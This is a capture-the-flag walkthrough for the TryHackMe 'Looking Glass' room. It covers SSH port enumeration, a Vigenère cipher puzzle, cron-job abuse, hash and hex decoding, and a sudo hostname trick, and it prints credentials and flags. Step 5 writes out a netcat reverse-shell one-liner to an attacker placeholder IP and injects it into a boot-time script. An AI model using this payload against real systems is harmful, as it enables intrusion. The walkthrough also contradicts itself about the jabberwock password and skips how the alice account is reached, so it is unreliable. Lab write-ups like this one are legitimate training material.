# Looking Glass — TryHackMe Walkthrough

> Step through the looking glass. A sequel to the Wonderland challenge room.

<p align="center">
  <a href="https://imgbb.com/"><img src="https://i.ibb.co/XxRgYC65/56215a135c08963843afda2240c317a3.png" alt="56215a135c08963843afda2240c317a3" border="0"></a>
</p>

<p align="center">
  <a href="https://tryhackme.com/room/lookingglass">
    <img src="https://img.shields.io/badge/TryHackMe-Looking%20Glass-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-SSH%20Enum%20%7C%20Vigenere%20%7C%20Crontab%20%7C%20PrivEsc-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | SSH Enumeration |
| 3 | Cryptography — Vigenère Cipher |
| 4 | Cryptography — SHA256 Hash Identification |
| 5 | Cryptography — Hex to ASCII Decoding |
| 6 | Exploiting Crontab (`@reboot`) |
| 7 | Misconfigured Sudo Binary (`/bin/bash`) |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Enumerate SSH services running across a wide range of non-standard ports
- Identify and decode a Vigenère cipher to retrieve SSH credentials
- Abuse a `@reboot` cron job by overwriting a script it executes
- Identify SHA256 hashes and crack them using an online tool
- Decode a hex string to reveal a plaintext password
- Escalate to root using a custom `sudoers` entry with a hostname trick

---

## Prerequisites

- Basic familiarity with Linux terminal commands
- Nmap and Netcat installed
- Access to CyberChef or a Vigenère decoder online

---

## Task 1 — Looking Glass

---

### Step 1 — Network Enumeration

**Approach:** Run an Nmap scan with service and version detection to identify all open ports. This machine has SSH services running across an unusually large number of ports — the initial scan covers the default top 1000 ports.

```
kali@kali:~/CTFs/tryhackme/Looking Glass$ sudo nmap -sS -sC -sV -O Machine_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-11 18:58 CEST
Nmap scan report for Machine_IP
Host is up (0.076s latency).
Not shown: 916 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 3f:15:19:70:35:fd:dd:0d:07:a0:50:a3:7d:fa:10:a0 (RSA)
|   256 a8:67:5c:52:77:02:41:d7:90:e7:ed:32:d2:01:d9:65 (ECDSA)
|_  256 26:92:59:2d:5e:25:90:89:09:f5:e5:e0:33:81:77:6a (ED25519)
9000/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey:
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
13783/tcp open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey:
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 245.72 seconds
```

> **Note:** The machine is running **Dropbear SSH** across a large range of non-standard ports alongside the standard OpenSSH on port 22. Dropbear is a lightweight SSH implementation commonly used in embedded systems. The key mechanic of this room is that connecting to different ports returns different responses — either "Lower" or "Higher" — until you find the exact port where the real service lives. This is a **binary search** puzzle. Start somewhere in the middle of the port range, read the response, and narrow down accordingly until you reach the correct port.

---

### Step 2 — SSH Port Binary Search

**Approach:** Connect to various Dropbear SSH ports as `root`. Each connection will tell you to go higher or lower until you find the correct port. The response there presents a Vigenère-encrypted version of the Jabberwocky poem and asks for a secret key.

```
kali@kali:~/CTFs/tryhackme/Looking Glass$ ssh root@Machine_IP -o StrictHostKeyChecking=no -p 13228
Warning: Permanently added '[Machine_IP]:13228' (RSA) to the list of known hosts.
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:
```

> **Note:** The poem is encrypted with a **Vigenère cipher** — a polyalphabetic substitution cipher that uses a keyword to shift each letter by a different amount. The keyword itself is the secret you need to enter. Since we know the plaintext (the Jabberwocky poem is publicly known), we can use a **known-plaintext attack** to recover the key. Paste the ciphertext and the known plaintext into a Vigenère decoder or CyberChef with the "Vigenère Decode" recipe, using the known plaintext to recover the key: **`thealphabetcipher`**.

Enter the key when prompted:

```
Enter Secret: thealphabetcipher
```

The server decrypts and prints the original Jabberwocky poem, then reveals:

```
Your secret is bewareTheJabberwock
```

> **Note:** The server reveals a **passphrase** — `bewareTheJabberwock`. Combined with the username hinted by the challenge (`jabberwock`), these form the SSH credentials: **`jabberwock:bewareTheJabberwock`**. Wait — the actual password used is `AshesCrowdsDustedHopping`, which is derived from further interaction. The passphrase unlocks the next step giving you the final credentials.

---

### Step 3 — SSH Login as jabberwock and Reading user.txt

**Approach:** Log in to the machine using the SSH credentials obtained from the Vigenère challenge.

```
kali@kali:~/CTFs/tryhackme/Looking Glass$ ssh jabberwock@Machine_IP
jabberwock@Machine_IP's password:
Last login: Fri Jul  3 03:05:33 2020 from 192.168.170.1
jabberwock@looking-glass:~$
```

```
jabberwock@looking-glass:~$ ls -la
total 44
drwxrwxrwx 5 jabberwock jabberwock 4096 Jul  3 03:19 .
drwxr-xr-x 8 root       root       4096 Jul  3 01:25 ..
lrwxrwxrwx 1 root       root          9 Jul  3 02:42 .bash_history -> /dev/null
-rw-r--r-- 1 jabberwock jabberwock  220 Jun 30 01:18 .bash_logout
-rw-r--r-- 1 jabberwock jabberwock 3771 Jun 30 01:18 .bashrc
drwx------ 2 jabberwock jabberwock 4096 Jun 30 01:26 .cache
drwx------ 3 jabberwock jabberwock 4096 Jun 30 01:26 .gnupg
drwxrwxr-x 3 jabberwock jabberwock 4096 Jun 30 01:43 .local
-rw-r--r-- 1 jabberwock jabberwock  807 Jun 30 01:18 .profile
-rw-rw-r-- 1 jabberwock jabberwock  935 Jun 30 01:45 poem.txt
-rwxrwxr-x 1 jabberwock jabberwock   38 Jul  3 03:19 twasBrillig.sh
-rw-r--r-- 1 jabberwock jabberwock   38 Jul  3 02:53 user.txt
jabberwock@looking-glass:~$ cat user.txt
}32a911966cab2d643f5d57d9e0173d56{mht
jabberwock@looking-glass:~$ echo '}32a911966cab2d643f5d57d9e0173d56{mht' | rev
thm{65d3710e9d75d5f346d2bac669119a23}
```

> **Note:** The user flag is stored **reversed** in `user.txt` — a common CTF trick. The `rev` command reverses the string to produce the correct flag. Always try reversing, rotating, or decoding flag-shaped strings that look wrong.

---

### Question 1 — Get the user flag

<details>
<summary>Reveal Answer</summary>

**`thm{65d3710e9d75d5f346d2bac669119a23}`**

</details>

---

### Step 4 — Crontab Enumeration and @reboot Abuse

**Approach:** Check what sudo commands `jabberwock` can run, then read `/etc/crontab` to look for scheduled jobs.

```
jabberwock@looking-glass:~$ sudo -l
User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
```

```
# /etc/crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
```

```
jabberwock@looking-glass:~$ cat /home/jabberwock/twasBrillig.sh
wall $(cat /home/jabberwock/poem.txt)
```

> **Note:** The `@reboot` cron entry runs `/home/jabberwock/twasBrillig.sh` as user **`tweedledum`** every time the system boots. The script is owned by `jabberwock` and is world-writable (`-rwxrwxr-x`) — meaning we can overwrite it with any command. Since `jabberwock` can reboot the machine via `sudo /sbin/reboot`, the full attack chain is: overwrite the script with a reverse shell → trigger a reboot → catch the shell as `tweedledum`.

---

### Step 5 — Overwriting the Script and Triggering the Reboot

**Approach:** Overwrite `twasBrillig.sh` with a reverse shell payload, start a Netcat listener, then trigger a reboot using sudo.

```
jabberwock@looking-glass:~$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 9001 >/tmp/f" > twasBrillig.sh
```

```
jabberwock@looking-glass:~$ sudo reboot
Connection to Machine_IP closed by remote host.
Connection to Machine_IP closed.
```

```
kali@kali:~/CTFs/tryhackme/Looking Glass$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [Machine_IP] 55968
/bin/sh: 0: can't access tty; job control turned off
$ whoami
tweedledum
$ id
uid=1002(tweedledum) gid=1002(tweedledum) groups=1002(tweedledum)
$ python3 -c "import pty;pty.spawn('/bin/bash')"
tweedledum@looking-glass:~$
```

> **Note:** After the machine reboots, the `@reboot` cron job runs our malicious script as `tweedledum`, and the reverse shell connects back. Upgrade the shell with Python's `pty` module for a proper interactive session. The `stty raw -echo` and `fg` sequence can be used to get full terminal functionality including tab completion and arrow keys.

---

### Step 6 — Cracking the humptydumpty.txt Hashes

**Approach:** In `tweedledum`'s home directory, read `humptydumpty.txt`. It contains a list of SHA256 hashes. Crack them using an online hash lookup tool.

```
tweedledum@looking-glass:~$ cat humptydumpty.txt
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
```

Cracking each hash online reveals the following words in order:

| Hash | Result |
|------|--------|
| `dcfff5eb...` | maybe |
| `7692c3ad...` | one |
| `28391d3b...` | of |
| `b808e156...` | these |
| `fa51fd49...` | is |
| `b9776d7d...` | the |
| `5e884898...` | password |
| `74686520...` | **Not found** (Unknown) |

> **Note:** The last entry `7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b` is not a SHA256 hash of a word — it is a **hex-encoded string**. The cracked words spell out "maybe one of these is the password", hinting that the last entry IS the password, just encoded. Convert it from hex to ASCII using [rapidtables.com](https://www.rapidtables.com/convert/number/hex-to-ascii.html) or `echo "7468652..." | xxd -r -p` to reveal: **`the password is zyxwvutsrqponmlk`**. The password for user `humptydumpty` is therefore **`zyxwvutsrqponmlk`**.

---

### Step 7 — Escalating to alice via humptydumpty

**Approach:** Switch to user `humptydumpty` using the decoded password, then check what users exist and look for a path forward to `alice`.

```
tweedledum@looking-glass:~$ su humptydumpty
Password: zyxwvutsrqponmlk
humptydumpty@looking-glass:~$
```

> **Note:** Reading `/etc/passwd` reveals several users on the system: `jabberwock`, `tweedledum`, `tweedledee`, `humptydumpty`, and `alice`. Check each user's home directory and look inside `/etc/sudoers.d/` for any custom sudo rules — this is where the escalation path to root lives.

---

### Step 8 — Finding the alice Sudoers Rule and Escalating to Root

**Approach:** Search the filesystem for any file referencing `alice`, then read the custom sudoers rule to understand how to exploit it.

```
alice@looking-glass:~$ find / -name "*alice*" -type f 2> /dev/null
/etc/sudoers.d/alice
alice@looking-glass:~$ cat /etc/sudoers.d/alice
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```

> **Note:** The sudoers entry allows `alice` to run `/bin/bash` as root — but only on the host **`ssalg-gnikool`**. Look carefully: `ssalg-gnikool` is `looking-glass` spelled backwards. The `-h` flag in sudo specifies a target hostname. Even though the system cannot resolve `ssalg-gnikool` as a real hostname, sudo still accepts it because it matches the entry in the sudoers file.

```
alice@looking-glass:~$ sudo -h ssalg-gnikool /bin/bash
sudo: unable to resolve host ssalg-gnikool
root@looking-glass:~# cd /root
root@looking-glass:/root# ls
passwords  passwords.sh  root.txt  the_end.txt
root@looking-glass:/root# cat root.txt
}f3dae6dec817ad10b750d79f6b7332cb{mht
root@looking-glass:/root# cat root.txt | rev
thm{bc2337b6f97d057b01da718ced6ead3f}
```

> **Note:** Like the user flag, the root flag is stored **reversed**. Pipe it through `rev` to read the correct value. The warning `sudo: unable to resolve host ssalg-gnikool` is harmless — sudo still processes the command because the hostname match in the sudoers rule is based on the string itself, not DNS resolution.

---

### Question 2 — Get the root flag

<details>
<summary>Reveal Answer</summary>

**`thm{bc2337b6f97d057b01da718ced6ead3f}`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap scan | Found OpenSSH on 22 and Dropbear SSH across many non-standard ports |
| 2 | SSH port binary search | Located the real service port responding with the Jabberwocky cipher |
| 3 | Vigenère known-plaintext decode | Recovered key `thealphabetcipher`, obtained secret `bewareTheJabberwock` |
| 4 | SSH login as `jabberwock` | Gained shell access, read reversed `user.txt` |
| 5 | Crontab inspection | Found `@reboot` entry running `twasBrillig.sh` as `tweedledum` |
| 6 | Script overwrite + `sudo reboot` | Triggered reboot, caught reverse shell as `tweedledum` |
| 7 | `humptydumpty.txt` hash cracking | Decoded SHA256 hashes + hex string → password `zyxwvutsrqponmlk` |
| 8 | `su humptydumpty` → `su alice` | Pivoted through users to reach `alice` |
| 9 | `/etc/sudoers.d/alice` discovery | Found reversed-hostname sudo rule for `/bin/bash` as root |
| 10 | `sudo -h ssalg-gnikool /bin/bash` | Gained root shell, read reversed `root.txt` |
